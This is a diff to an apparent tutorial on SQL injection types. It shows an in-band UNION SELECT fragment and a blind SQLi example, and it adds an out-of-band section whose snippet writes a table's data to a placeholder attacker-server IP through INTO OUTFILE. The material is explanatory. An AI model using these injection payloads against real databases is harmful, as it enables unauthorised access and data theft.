@@ -13,7 +13,7 @@ This attack occurs when the attacker uses the same communication channel to carr
 ```sql
  UNION SELECT 1
 ```
----
+
 ## Blind SQLi
 This is the type of SQL injection attack that queries the database and returns true or false.
 
@@ -22,4 +22,10 @@ This is the type of SQL injection attack that queries the database and returns t
 www.target.com/accounts.php?id=1
 
 SELECT * FROM accounts WHERE ID = 1
+```
+## Out-of-Band SQL
+When an attacker manages to manipulate the data query through hacking and transmit it to a server controlled by the attacker.
+```sql
+select * from target
+into OUTFILE '\\My Malicious Server  IP'
 ```
